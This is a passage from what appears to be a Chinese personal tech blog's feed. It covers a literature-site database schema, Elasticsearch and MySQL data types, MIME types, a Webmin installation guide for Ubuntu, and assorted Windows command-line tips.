Articles（文章表）</h4><p><strong>描述</strong>：存储用户发表的文章信息，包括标题、内容和状态。</p><table><thead><tr><th>序号</th><th>数据项名称</th><th>数据类型</th><th>范围约束</th><th>关键数据项</th><th>含义</th></tr></thead><tbody><tr><td>1</td><td>ArticleID</td><td>INT</td><td>无</td><td>是</td><td>文章表主键，自增</td></tr><tr><td>2</td><td>UserID</td><td>INT</td><td>无</td><td>是</td><td>作者用户ID（外键，引用 Users.UserID）</td></tr><tr><td>3</td><td>CategoryID</td><td>INT</td><td>无</td><td>是</td><td>所属版块ID（外键，引用 Categories.CategoryID）</td></tr><tr><td>4</td><td>Title</td><td>VARCHAR(200)</td><td>非空</td><td>否</td><td>文章标题</td></tr><tr><td>5</td><td>Content</td><td>TEXT</td><td>非空</td><td>否</td><td>文章内容</td></tr><tr><td>6</td><td>Status</td><td>ENUM</td><td>‘Draft’, ‘Pending’, ‘Published’, ‘Deleted’</td><td>否</td><td>文章状态</td></tr><tr><td>7</td><td>CreatedAt</td><td>TIMESTAMP</td><td>无</td><td>否</td><td>文章创建时间</td></tr><tr><td>8</td><td>UpdatedAt</td><td>TIMESTAMP</td><td>无</td><td>否</td><td>文章更新时间</td></tr></tbody></table><hr><h4 id="5-Comments（留言表）"><a href="#5-Comments（留言表）" class="headerlink" title="5. Comments（留言表）"></a>5. Comments（留言表）</h4><p><strong>描述</strong>：存储游客和会员对文章的留言。</p><table><thead><tr><th>序号</th><th>数据项名称</th><th>数据类型</th><th>范围约束</th><th>关键数据项</th><th>含义</th></tr></thead><tbody><tr><td>1</td><td>CommentID</td><td>INT</td><td>无</td><td>是</td><td>留言表主键，自增</td></tr><tr><td>2</td><td>ArticleID</td><td>INT</td><td>无</td><td>是</td><td>关联文章ID（外键，引用 Articles.ArticleID）</td></tr><tr><td>3</td><td>UserID</td><td>INT</td><td>可为空</td><td>否</td><td>留言用户ID（外键，引用 Users.UserID）</td></tr><tr><td>4</td><td>GuestEmail</td><td>VARCHAR(100)</td><td>可为空</td><td>否</td><td>游客邮箱</td></tr><tr><td>5</td><td>Content</td><td>TEXT</td><td>非空</td><td>否</td><td>留言内容</td></tr><tr><td>6</td><td>CreatedAt</td><td>TIMESTAMP</td><td>无</td><td>否</td><td>留言时间</td></tr></tbody></table><hr><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><ul><li><strong>关键数据项</strong>：标记为“是”的字段是主键或外键，用于唯一标识记录或关联其他表。</li><li><strong>范围约束</strong>：<ul><li><strong>非空</strong>：该字段不能为空。</li><li><strong>唯一</strong>：该字段值在表中必须唯一。</li><li><strong>可为空</strong>：该字段可以为空，如 Comments 表中的 UserID 和 GuestEmail。</li></ul></li><li><strong>数据类型</strong>：<ul><li><strong>INT</strong>：整数类型，用于ID字段。</li><li>**VARCHAR(n)**：变长字符串，n 为最大长度。</li><li><strong>TEXT</strong>：长文本类型，用于文章和留言内容。</li><li><strong>ENUM</strong>：枚举类型，限制取值范围，如 Role 和 Status。</li><li><strong>TIMESTAMP</strong>：时间戳，记录创建和更新时间。</li></ul></li><li><strong>外键关系</strong>：<ul><li>Moderators.UserID 引用 Users.UserID</li><li>Moderators.CategoryID 引用 Categories.CategoryID</li><li>Articles.UserID 引用 Users.UserID</li><li>Articles.CategoryID 引用 Categories.CategoryID</li><li>Comments.ArticleID 引用 Articles.ArticleID</li><li>Comments.UserID 引用 Users.UserID（可为空）</li></ul></li><li><strong>其他约束</strong>：Comments 表中 UserID 和 GuestEmail 至少一个不为空，以支持游客和会员留言。</li></ul><hr><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>以上数据表设计满足文学网站的核心需求，包括用户管理、版块分类、版主授权、文章发布和留言功能。设计中充分考虑了字段类型、约束和外键关系，确保数据的一致性、完整性和查询效率。</p><h3 id="1-导图：Map：数据类型和传参"><a href="#1-导图：Map：数据类型和传参" class="headerlink" title="1. 导图：Map：数据类型和传参"></a>1. 导图：<a href="Map%EF%BC%9A%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%92%8C%E4%BC%A0%E5%8F%82.xmind">Map：数据类型和传参</a></h3><hr><h3 id="2-ES-数据类型"><a href="#2-ES-数据类型" class="headerlink" title="2. ES 数据类型"></a>2. ES 数据类型</h3><table><thead><tr><th><strong>名称</strong></th><th><strong>范围</strong></th><th><strong>描述</strong></th><th><strong>赋值示例</strong></th></tr></thead><tbody><tr><td><strong>数值类型</strong></td><td></td><td></td><td></td></tr><tr><td><code>byte</code></td><td>1字节，-128 ~ 127</td><td>小范围整数</td><td><code>&quot;age&quot;: 20</code></td></tr><tr><td><code>short</code></td><td>2 字节，-32768 ~ 32767</td><td>稍大范围整数</td><td><code>&quot;small_order_count&quot;: 300</code></td></tr><tr><td><code>integer</code></td><td>4 字节，-2^31 ~ 2^31 -1</td><td>常规整数</td><td><code>&quot;sales_volume&quot;: 1234567890123</code></td></tr><tr><td><code>long</code></td><td>8 字节，-2^63 ~ 2^63 -1</td><td>非常大的整数</td><td><code>&quot;sales_volume&quot;: 1234567890123</code></td></tr><tr><td><code>half_float</code></td><td>2 字节，3 ~ 5 位十进制精度</td><td>半精度浮点数牺牲精度，节省空间</td><td><code>&quot;sensor_data&quot;: 12.3</code></td></tr><tr><td><code>float</code></td><td>4 字节，7 位十进制精度</td><td>常规浮点数，精度较低</td><td><code>&quot;rating&quot;: 4.5</code></td></tr><tr><td><code>double</code></td><td>8 字节，15 ~ 16 位十进制精度</td><td>双精度浮点数，高精度，适合科学计算</td><td><code>&quot;measurement_value&quot;: 0.000000123</code></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td><strong>字符串类型</strong></td><td></td><td></td><td></td></tr><tr><td><code>keyword</code></td><td></td><td>精确值</td><td><code>&quot;status&quot;: &quot;published&quot;</code></td></tr><tr><td><code>text</code></td><td></td><td>可分词文本</td><td><code>&quot;title&quot;: &quot;Elasticsearch Guide&quot;</code></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td><strong>布尔类型</strong></td><td></td><td></td><td></td></tr><tr><td><code>boolean</code></td><td>1字节，true、false</td><td></td><td><code>&quot;is_online&quot;: true</code></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td><strong>日期与时间类型</strong></td><td></td><td></td><td></td></tr><tr><td><code>date</code></td><td>支持从 1970-01-01T00:00:00Z 起的正负时间戳，实际范围取决于具体日期解析格式等</td><td>存储日期时间信息</td><td><code>&quot;created_time&quot;: &quot;2025-04-04T10:30:00Z&quot;</code>（标准格式赋值）</td></tr><tr><td><code>date_nanos</code></td><td>可存储到纳秒级别精度的日期时间，范围从 1970-01-01T00:00:00Z 起的正负纳秒时间戳</td><td>对时间精度要求极高的场景，如金融交易的精确时间戳、高精度实验数据的时间记录等</td><td><code>&quot;trade_time&quot;: &quot;2025-04-04T10:30:00.123456789Z&quot;</code>（标准格式赋值）</td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td><strong>地理空间类型</strong></td><td></td><td></td><td></td></tr><tr><td><code>geo_point</code></td><td>经度范围 -180.0 ~ 180.0，纬度范围 -90.0 ~ 90.0</td><td>存储由经度和纬度确定的地理坐标点</td><td><code>&quot;location&quot;: &#123; 39.9042, 116.4074 &#125;</code><br>（39.9042 是纬度，116.4074 是经度）</td></tr><tr><td><code>geo_shape</code></td><td></td><td>存储由多个 <code>geo_point</code> 组成的复杂的地理形状数据，如点、线、面、多边形等</td><td><strong>点</strong>：<code>&quot;area_shape&quot;: &#123; &quot;type&quot;: &quot;point&quot;, &quot;coordinates&quot;: [40.73, -73.93] &#125;</code><br><strong>矩形</strong>：<code>&quot;area_shape&quot;: &#123; &quot;type&quot;: &quot;envelope&quot;,&quot;coordinates&quot;: [[-74, 40], [-73, 41]] &#125;</code><br><strong>圆形</strong>：<code>&quot;area_shape&quot;: &#123; &quot;type&quot;: &quot;circle&quot;, &quot;coordinates&quot;: [100.0, 0.0],   &quot;radius&quot;: &quot;100m“ &#125;</code><br><strong>任意形状</strong>：<code>&quot;area_shape&quot;: &#123; &quot;type&quot;: &quot;polygon&quot;, &quot;coordinates&quot;: [[ [100.0, 0.0], [101.0, 0.0], [101.0, 1.0], [100.0, 1.0], [100.0, 0.0] ]] &#125;</code></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td><strong>复杂类型</strong></td><td></td><td></td><td></td></tr><tr><td><code>object</code></td><td></td><td>用于在文档中嵌套其他文档，将相关字段组织在一起，如存储用户的详细信息（姓名、年龄、地址等在一个对象中）</td><td><code>&quot;user_info&quot;: &#123; &quot;name&quot;: &quot;John&quot;, &quot;age&quot;: 30, &quot;address&quot;: &quot;New York&quot; &#125;</code></td></tr><tr><td><code>nested</code></td><td></td><td>与 <code>object</code> 类似，用于嵌套数组对象，使数组中的每个对象都能被独立地查询和聚合，如存储一篇博客的多条评论，每个评论又包含评论者信息、评论内容等</td><td><code>&quot;comments&quot;: [ &#123; &quot;user&quot;: &quot;Alice&quot;, &quot;content&quot;: &quot;Great post!&quot; &#125;, &#123; &quot;user&quot;: &quot;Bob&quot;, &quot;content&quot;: &quot;Very helpful.&quot; &#125; ]</code></td></tr></tbody></table><hr><h3 id="3-MySQL-数据类型"><a href="#3-MySQL-数据类型" class="headerlink" title="3. MySQL 数据类型"></a>3. MySQL 数据类型</h3><table><thead><tr><th>名称</th><th>范围</th><th>描述</th><th>赋值示例</th></tr></thead><tbody><tr><td><strong>数值类型</strong></td><td></td><td></td><td></td></tr><tr><td><code>TINYINT</code></td><td>1 字节，-128 ~ 127</td><td>小范围整数</td><td><code>INSERT INTO table (tinyint_column) VALUES (20);</code></td></tr><tr><td><code>SMALLINT</code></td><td>2 字节，-32768 ~ 32767</td><td>稍大范围整数</td><td><code>INSERT INTO table (smallint_column) VALUES (300);</code></td></tr><tr><td><code>MEDIUMINT</code></td><td>3 字节，-8,388,608 ~ 8,388,607</td><td>中等范围整数</td><td><code>INSERT INTO table (mediumint_column) VALUES (500000);</code></td></tr><tr><td><code>INT</code></td><td>4 字节，-2^31 ~ 2^31 - 1（21 亿）</td><td>常规整数</td><td><code>INSERT INTO table (int_column) VALUES (1000000);</code></td></tr><tr><td><code>BIGINT</code></td><td>8 字节，-2^63 ~ 2^63 - 1</td><td>非常大的整数</td><td><code>INSERT INTO table (bigint_column) VALUES (9223372036854775807);</code></td></tr><tr><td><code>FLOAT</code></td><td>4 字节，7 位十进制精度</td><td>常规浮点数，单精度，精度较低</td><td><code>INSERT INTO table (float_column) VALUES (4.5);</code></td></tr><tr><td><code>DOUBLE</code></td><td>8 字节，15 ~ 16 位十进制精度</td><td>双精度浮点数，精度高，适合科学计算</td><td><code>INSERT INTO table (double_column) VALUES (0.000000123);</code></td></tr><tr><td><code>DECIMAL</code></td><td>精度可调，最大精度 65</td><td>精确小数，不丢失精度，适合金额等精度要求</td><td><code>INSERT INTO table (decimal_column) VALUES (1234567890.12);</code></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td><strong>字符串类型</strong></td><td></td><td></td><td></td></tr><tr><td><code>CHAR(n)</code></td><td>0 ~ 255 字符</td><td>定长字符串，无论实际存储多少内容，始终占用 <code>n</code> 个字符的空间（不足部分用空格填充）。</td><td><code>INSERT INTO table (char_column) VALUES (&#39;abc&#39;);</code></td></tr><tr><td><code>VARCHAR(n)</code></td><td>0 ~ 65535 字符</td><td>变长字符串，根据实际内容动态分配空间，<code>n</code> 表示可存储的最大字符数，不会浪费空间。</td><td><code>INSERT INTO table (varchar_column) VALUES (&#39;Elasticsearch Guide&#39;);</code></td></tr><tr><td><code>TINYTEXT</code></td><td>最大 255 字符</td><td>变长字符串，用于存储短文本</td><td><code>INSERT INTO table (tinytext_column) VALUES (&#39;Hello&#39;);</code></td></tr><tr><td><code>TEXT</code></td><td>最大 65,535 字符（64KB）</td><td>变长字符串，用于存储较长文本</td><td><code>INSERT INTO table (text_column) VALUES (&#39;This is a long text...&#39;);</code></td></tr><tr><td><code>MEDIUMTEXT</code></td><td>最大 16,777,215 字符（16MB）</td><td>变长字符串，用于存储更长文本</td><td><code>INSERT INTO table (mediumtext_column) VALUES (&#39;Very long...&#39;);</code></td></tr><tr><td><code>LONGTEXT</code></td><td>最大 4,294,967,295 字符（4GB）</td><td>变长字符串，用于存储极长文本</td><td><code>INSERT INTO table (longtext_column) VALUES (&#39;Extremely long...&#39;);</code></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td><strong>日期与时间类型</strong></td><td></td><td></td><td></td></tr><tr><td><code>DATE</code></td><td>1000-01-01 ~ 9999-12-31</td><td>仅日期</td><td><code>INSERT INTO table (date_column) VALUES (&#39;2000-01-01&#39;);</code></td></tr><tr><td><code>TIME</code></td><td>-838:59:59 ~ 838:59:59</td><td>仅时间</td><td><code>INSERT INTO table (time_column) VALUES (&#39;14:30:00&#39;);</code></td></tr><tr><td><code>DATETIME</code></td><td>1000-01-01 00:00:00 ~ 9999-12-31 23:59:59</td><td>日期 + 时间</td><td><code>INSERT INTO table (datetime_column) VALUES (&#39;2025-04-04 10:30:00&#39;);</code></td></tr><tr><td><code>YEAR</code></td><td>1901 ~ 2155</td><td>仅年份</td><td><code>INSERT INTO table (year_column) VALUES (2000);</code></td></tr><tr><td><code>TIMESTAMP</code></td><td>1970-01-01 00:00:01 ~ 2038-01-19 03:14:07 UTC</td><td>自动记录当前时间戳（非 Unix 中的时间戳，而是：YYYY-MM-DD HH:MM:SS）</td><td><code>INSERT INTO table (timestamp_column) VALUES (CURRENT_TIMESTAMP);</code></td></tr></tbody></table><hr><h3 id="Redis-数据类型"><a href="#Redis-数据类型" class="headerlink" title="Redis 数据类型"></a>Redis 数据类型</h3>]]></content>
    
    
    <categories>
      
      <category>数据管理</category>
      
      <category>关系型数据库</category>
      
      <category>MySQL</category>
      
      <category>MySQL 基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：MIME 类型</title>
    <link href="/2025/04/05/%E7%AC%94%E8%AE%B0%EF%BC%9AMIME%20%E7%B1%BB%E5%9E%8B/"/>
    <url>/2025/04/05/%E7%AC%94%E8%AE%B0%EF%BC%9AMIME%20%E7%B1%BB%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<p>MIME 类型用于表示文档、文件或数据的类型，告诉客户端如何解析响应的内容,常用于 HTTP 协议的 <code>Content-Type</code> 和 <code>Accept</code> 头，指明发送或接收的数据格式，一般格式为：<code>type/subtype</code>。以下是一些常见的 MIME 类型：</p><ol><li>&#x3D;&#x3D;文本类型（Text Types）&#x3D;&#x3D;<ol><li><font color="#00b0f0">text&#x2F;html</font>：HTML 文档</li><li><font color="#00b0f0">text&#x2F;plain</font>：纯文本</li><li><font color="#00b0f0">text&#x2F;css</font>：CSS 样式表</li><li><font color="#00b0f0">text&#x2F;javascript</font> 或 <font color="#00b0f0">application&#x2F;javascript</font>：JavaScript 脚本</li><li><font color="#00b0f0">text&#x2F;csv</font>：CSV 格式的文本文件</li></ol></li><li>&#x3D;&#x3D;应用程序类型（Application Types）&#x3D;&#x3D;<ol start="6"><li><font color="#00b0f0">application&#x2F;json</font>：JSON 数据格式</li><li><font color="#00b0f0">application&#x2F;xml</font>：XML 数据格式</li><li><font color="#00b0f0">application&#x2F;xhtml+xml</font>：XHTML 文档</li><li><font color="#00b0f0">application&#x2F;pdf</font>：PDF 文件</li><li><font color="#00b0f0">application&#x2F;zip</font>：ZIP 压缩文件</li><li><font color="#00b0f0">application&#x2F;octet-stream</font>：任意的二进制数据（常用于文件下载）</li><li><font color="#00b0f0">application&#x2F;msword</font>：Microsoft Word 文档</li><li><font color="#00b0f0">application&#x2F;vnd.openxmlformats-officedocument.wordprocessingml.document</font>：Word 文档（.docx）</li><li><font color="#00b0f0">application&#x2F;vnd.ms-excel</font>：Microsoft Excel 文档</li><li><font color="#00b0f0">application&#x2F;vnd.openxmlformats-officedocument.spreadsheetml.sheet</font>：Excel 文档（.xlsx）</li></ol></li><li>&#x3D;&#x3D;图像类型（Image Types）&#x3D;&#x3D;<ol><li><font color="#00b0f0">image&#x2F;jpeg</font>：JPEG 图像</li><li><font color="#00b0f0">image&#x2F;png</font>：PNG 图像</li><li><font color="#00b0f0">image&#x2F;gif</font>：GIF 图像</li><li><font color="#00b0f0">image&#x2F;svg+xml</font>：SVG 矢量图</li><li><font color="#00b0f0">image&#x2F;webp</font>：WebP 图像格式</li><li><font color="#00b0f0">image&#x2F;bmp</font>：BMP 图像</li></ol></li><li>&#x3D;&#x3D;音频类型（Audio Types）&#x3D;&#x3D;<ol><li><font color="#00b0f0">audio&#x2F;mpeg</font>：MP3 音频</li><li><font color="#00b0f0">audio&#x2F;ogg</font>：OGG 音频</li><li><font color="#00b0f0">audio&#x2F;wav</font>：WAV 音频</li><li><font color="#00b0f0">audio&#x2F;webm</font>：WebM 音频</li></ol></li><li>&#x3D;&#x3D;视频类型（Video Types）&#x3D;&#x3D;<ol><li><font color="#00b0f0">video&#x2F;mp4</font>：MP4 视频</li><li><font color="#00b0f0">video&#x2F;ogg</font>：OGG 视频</li><li><font color="#00b0f0">video&#x2F;webm</font>：WebM 视频</li><li><font color="#00b0f0">video&#x2F;x-msvideo</font>：AVI 视频</li></ol></li><li>&#x3D;&#x3D;字体类型（Font Types）&#x3D;&#x3D;<ol><li><font color="#00b0f0">font&#x2F;woff</font>：WOFF 字体</li><li><font color="#00b0f0">font&#x2F;woff2</font>：WOFF2 字体</li><li><font color="#00b0f0">application&#x2F;font-woff</font>：另一种 WOFF 的 MIME 类型</li><li><font color="#00b0f0">font&#x2F;ttf</font>：TrueType 字体（TTF）</li><li><font color="#00b0f0">font&#x2F;otf</font>：OpenType 字体（OTF）</li></ol></li><li>&#x3D;&#x3D;其他常见类型&#x3D;&#x3D;<ol><li><font color="#00b0f0">multipart&#x2F;form-data</font>：用于表单数据（文件上传）</li><li><font color="#00b0f0">application&#x2F;x-www-form-urlencoded</font>：URL 编码表单数据</li><li><font color="#00b0f0">application&#x2F;javascript</font>：JavaScript 代码</li></ol></li></ol>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
      <category>MIME 类型</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Webmin</title>
    <link href="/2025/04/05/%E7%AC%94%E8%AE%B0%EF%BC%9AWebmin/"/>
    <url>/2025/04/05/%E7%AC%94%E8%AE%B0%EF%BC%9AWebmin/</url>
    
    <content type="html"><![CDATA[<h1 id="一、理论"><a href="#一、理论" class="headerlink" title="一、理论"></a>一、理论</h1><h3 id="1-Webmin-概述"><a href="#1-Webmin-概述" class="headerlink" title="1. Webmin 概述"></a>1. Webmin 概述</h3><p><strong>Webmin</strong> 是一个基于网页的系统管理工具，主要用于管理和监控 Unix-like 操作系统（如 Linux 和 FreeBSD）的各种服务和系统资源，例如可以监控和管理以下内容：</p><ol><li>&#x3D;&#x3D;系统资源&#x3D;&#x3D;：<ul><li>CPU 使用率、内存、磁盘空间等。</li><li>系统负载、进程和服务状态。</li></ul></li><li>&#x3D;&#x3D;网络监控&#x3D;&#x3D;：<ul><li>查看网络流量、配置网络接口、管理防火墙等。</li><li>查看系统的 IP 地址、路由表和 DNS 设置。</li></ul></li><li>&#x3D;&#x3D;磁盘管理&#x3D;&#x3D;：<ul><li>管理硬盘分区、文件系统、挂载点等。</li><li>查看磁盘使用情况和文件系统的健康状态。</li></ul></li><li>&#x3D;&#x3D;服务和守护进程&#x3D;&#x3D;：<ul><li>启动、停止或重启服务（如 Apache、Nginx、MySQL 等）。</li><li>配置服务的启动项和日志设置。</li></ul></li><li>&#x3D;&#x3D;用户和权限管理&#x3D;&#x3D;：<ul><li>添加、删除、修改系统用户和组。</li><li>设置权限、访问控制和 sudo 权限。</li></ul></li><li>&#x3D;&#x3D;日志文件&#x3D;&#x3D;：<ul><li>查看系统日志、服务日志。</li><li>配置日志文件的轮转和备份策略。</li></ul></li><li>&#x3D;&#x3D;安全管理&#x3D;&#x3D;：<ul><li>配置防火墙（如 iptables 或 firewalld）。</li><li>设置 SSH 访问和密钥管理。</li></ul></li></ol><hr><h1 id="二、实操"><a href="#二、实操" class="headerlink" title="二、实操"></a>二、实操</h1><h3 id="1-安装-Webmin"><a href="#1-安装-Webmin" class="headerlink" title="1. 安装 Webmin"></a>1. 安装 Webmin</h3><p>以下是基于 Ubuntu 操作系统的安装步骤：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 安装必要依赖</span><br><span class="hljs-built_in">sudo</span> apt install -y perl libnet-ssleay-perl openssl libio-pty-perl libauthen-pam-perl<br><br><br><span class="hljs-comment"># 2. 下载 Webmin 安装包</span><br>wget https://sourceforge.net/projects/webadmin/files/webmin/2.303/webmin_2.303_all.deb<br><br><br><span class="hljs-comment"># 3. 安装 Webmin</span><br><span class="hljs-built_in">sudo</span> dpkg --install webmin_2.303_all.deb<br><br><br><span class="hljs-comment"># 4. 启动和设置开机自启动</span><br><span class="hljs-built_in">sudo</span> systemctl start webmin &amp;&amp; <span class="hljs-built_in">sudo</span> systemctl <span class="hljs-built_in">enable</span> webmin<br><br><br><span class="hljs-comment"># 5. 开放 Webmin 端口（默认10000）</span><br><span class="hljs-built_in">sudo</span> ufw allow 10000/tcp       <br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>您可以访问 SourceForge 查找最新版本：<a href="https://sourceforge.net/projects/webadmin/files/">Webmin 下载页面</a>。</li><li>注意要下载 deb 后缀的文件</li></ol></blockquote><hr><h4 id="2-访问-Webmin"><a href="#2-访问-Webmin" class="headerlink" title="2. 访问 Webmin"></a>2. 访问 Webmin</h4><p>在 Windows 的浏览器访问：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://&lt;Linux-server-ip&gt;:<span class="hljs-number">10000</span>（<span class="hljs-number">192.168.136.8:10000</span>）<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>登录时使用的是 Ubuntu 系统中的用户名和密码。你可以使用不同的用户进行登录，例如 <code>root</code>、<code>user</code> 或 <code>admin</code>。</li></ol></blockquote>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
      <category>Linux</category>
      
      <category>Webmin</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Windows</title>
    <link href="/2025/04/05/%E7%AC%94%E8%AE%B0%EF%BC%9AWindows/"/>
    <url>/2025/04/05/%E7%AC%94%E8%AE%B0%EF%BC%9AWindows/</url>
    
    <content type="html"><![CDATA[<h2 id="1-调整电源状态"><a href="#1-调整电源状态" class="headerlink" title="1. 调整电源状态"></a>1. 调整电源状态</h2><h3 id="1-1-常见电源状态"><a href="#1-1-常见电源状态" class="headerlink" title="1.1. 常见电源状态"></a>1.1. 常见电源状态</h3><table><thead><tr><th>状态</th><th>屏幕</th><th>程序</th><th>网络连接</th><th>是否继续运行任务</th></tr></thead><tbody><tr><td>正常运行</td><td>亮</td><td>是</td><td>是</td><td>是</td></tr><tr><td>仅息屏</td><td>关</td><td>是</td><td>是</td><td>是 ✅</td></tr><tr><td>睡眠（Sleep）</td><td>关</td><td>否（挂起）</td><td>否</td><td>否 ❌</td></tr><tr><td>休眠（Hibernate）</td><td>关</td><td>否（写入硬盘）</td><td>否</td><td>否 ❌</td></tr></tbody></table><hr><h3 id="1-2-修改电源状态"><a href="#1-2-修改电源状态" class="headerlink" title="1.2. 修改电源状态"></a>1.2. 修改电源状态</h3><h2 id="控制面板-→-硬件和声音-→-电源选项-→-更改计划设置"><a href="#控制面板-→-硬件和声音-→-电源选项-→-更改计划设置" class="headerlink" title="控制面板 → 硬件和声音 → 电源选项 → 更改计划设置    "></a>控制面板 → 硬件和声音 → 电源选项 → 更改计划设置    </h2><h2 id="查看-CPU-架构"><a href="#查看-CPU-架构" class="headerlink" title="查看 CPU 架构"></a>查看 CPU 架构</h2><p>打开 PowerShell，输入下面的指令，<code>AMD64</code>：就是 amd64，<code>ARM64</code>：就是 arm64</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">echo</span> $<span class="hljs-keyword">en</span><span class="hljs-variable">v:PROCESSOR_ARCHITECTURE</span><br></code></pre></td></tr></table></figure><hr><h2 id="解决网页残留问题"><a href="#解决网页残留问题" class="headerlink" title="解决网页残留问题"></a>解决网页残留问题</h2><ol><li>打开注册表（Win + R ，输入 <code>regedit</code>），</li><li>找到 <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Dwm</code></li><li>新增 OverlayTestMode 的DWORD 项，将其值修改为 <code>5</code>，</li><li>重启电脑<br><img src="/2025/04/05/%E7%AC%94%E8%AE%B0%EF%BC%9AWindows/image-20250503160117848.png"></li></ol><hr><h2 id="查看端口是否监听"><a href="#查看端口是否监听" class="headerlink" title="查看端口是否监听"></a>查看端口是否监听</h2><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">PS</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Users</span>\<span class="hljs-variable">ASUS</span><span class="hljs-operator">&gt;</span> <span class="hljs-variable">netstat</span> <span class="hljs-operator">-</span><span class="hljs-variable">ano</span> <span class="hljs-operator">|</span> <span class="hljs-built_in">Select</span><span class="hljs-operator">-</span><span class="hljs-built_in">String</span> <span class="hljs-string">&quot;7890&quot;</span><br><br>返回以下结果，说明 <span class="hljs-number">7890</span> 端口确实被一个进程 <span class="hljs-variable">PID</span> <span class="hljs-number">15144</span> 占用了<br>  <span class="hljs-variable">TCP</span>    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-operator">:</span><span class="hljs-number">7890</span>           <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-operator">:</span><span class="hljs-number">0</span>              <span class="hljs-variable">LISTENING</span>       <span class="hljs-number">15144</span><br>  <span class="hljs-variable">TCP</span>    <span class="hljs-punctuation">[</span><span class="hljs-operator">::</span><span class="hljs-punctuation">]</span><span class="hljs-operator">:</span><span class="hljs-number">7890</span>              <span class="hljs-punctuation">[</span><span class="hljs-operator">::</span><span class="hljs-punctuation">]</span><span class="hljs-operator">:</span><span class="hljs-number">0</span>                 <span class="hljs-variable">LISTENING</span>       <span class="hljs-number">15144</span><br></code></pre></td></tr></table></figure><hr><h2 id="软件添加到-Win"><a href="#软件添加到-Win" class="headerlink" title="软件添加到 Win"></a>软件添加到 Win</h2><p>创建软件快捷方式，拖进：<code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs</code></p><hr><h2 id="重置网络"><a href="#重置网络" class="headerlink" title="重置网络"></a>重置网络</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">netsh winsock <span class="hljs-keyword">reset</span><br><br>netsh <span class="hljs-keyword">int</span> ip <span class="hljs-keyword">reset</span><br></code></pre></td></tr></table></figure><hr><h3 id="查看核数"><a href="#查看核数" class="headerlink" title="查看核数"></a>查看核数</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Get</span>-WmiObject -<span class="hljs-keyword">Class</span> Win32_Processor | <span class="hljs-keyword">Select</span>-<span class="hljs-keyword">Object</span> <span class="hljs-type">Name</span>, NumberOfCores, NumberOfLogicalProcessors<br>- **NumberOfCores** 是物理核数<br>    <br>- **NumberOfLogicalProcessors** 是逻辑核数（启用了超线程会是核数的 <span class="hljs-number">2</span> 倍）<br></code></pre></td></tr></table></figure><p>我们可以简单理解为 VM分配的核心是逻辑核心</p><h2 id="测磁盘读写"><a href="#测磁盘读写" class="headerlink" title="测磁盘读写"></a>测磁盘读写</h2><p>很好，CrystalDiskMark 是 Windows 系统下最流行、操作最简单的硬盘读写速度测试工具之一。下面我一步一步教你怎么用：</p><hr><h2 id="✅-一、下载安装"><a href="#✅-一、下载安装" class="headerlink" title="✅ 一、下载安装"></a>✅ 一、下载安装</h2><ol><li><p><strong>访问官网下载地址</strong>：</p><ul><li><p>官网主页：<a href="https://crystalmark.info/en/software/crystaldiskmark/">https://crystalmark.info/en/software/crystaldiskmark/</a></p></li><li><p>选择适合你系统的版本：</p><ul><li><p>通常选“<strong>Standard Edition</strong>”</p></li><li><p>如果不想安装，也可以点“<strong>ZIP版（免安装）</strong>”，解压后直接运行。</p></li></ul></li></ul></li><li><p><strong>安装或解压后打开</strong>程序。</p></li></ol><hr><h2 id="✅-二、界面参数说明（见下图）"><a href="#✅-二、界面参数说明（见下图）" class="headerlink" title="✅ 二、界面参数说明（见下图）"></a>✅ 